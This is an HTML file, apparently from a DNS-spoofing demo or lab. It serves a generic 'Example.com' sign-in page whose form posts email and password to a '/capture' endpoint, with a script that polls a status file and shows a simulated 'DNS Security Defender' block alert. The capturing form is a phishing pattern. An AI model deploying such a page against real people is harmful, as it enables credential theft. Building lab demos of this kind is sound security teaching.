<!doctype html>
<html>
  <head>
    <title>Login - Example.com</title>
    <style>
      body {
        font-family: sans-serif;
        display: flex;
        justify-content: center;
        padding-top: 50px;
        background-color: #f4f4f4;
      }
      .box {
        border: 1px solid #ccc;
        padding: 30px;
        border-radius: 8px;
        width: 350px;
        background: white;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }
      h2 {
        color: #333;
        text-align: center;
      }
      input {
        width: 92%;
        padding: 12px;
        margin: 10px 0;
        border: 1px solid #ddd;
        border-radius: 4px;
      }
      button {
        width: 100%;
        padding: 12px;
        background: #007bff;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
      }
      button:hover {
        background: #0056b3;
      }
    </style>
    <script>
      // Check for attack detection every 500ms
      function checkForAttack() {
        fetch("attack_status.json")
          .then((response) => {
            if (response.ok) {
              return response.json();
            }
          })
          .then((data) => {
            if (data && data.attack_detected) {
              // Attack detected - show alert
              alert(
                "🚨 ALERT! MALICIOUS WEBSITE DETECTED!\n\nDomain: " +
                  data.domain +
                  "\nMalicious IP: " +
                  data.malicious_ip +
                  "\n\nThis website has been BLOCKED by DNS Security Defender.\n\nYou cannot access this page!",
              );
              // Redirect to blank page
              document.body.innerHTML =
                '<div style="text-align:center;padding:50px;background:#f00;color:white;font-size:20px;font-weight:bold;">🚨 WEBSITE BLOCKED 🚨</div>';
            }
          })
          .catch((error) => {
            // File doesn't exist - no attack, continue
          });
      }

      // Check on page load
      window.addEventListener("load", checkForAttack);

      // Keep checking every 500ms
      setInterval(checkForAttack, 500);
    </script>
  </head>
  <body>
    <div class="box">
      <h2>Sign In</h2>
      <form action="/capture" method="post">
        <input type="text" name="email" placeholder="Email Address" required />
        <input
          type="password"
          name="password"
          placeholder="Password"
          required
        />
        <button type="submit">Sign In</button>
      </form>
    </div>
  </body>
</html>
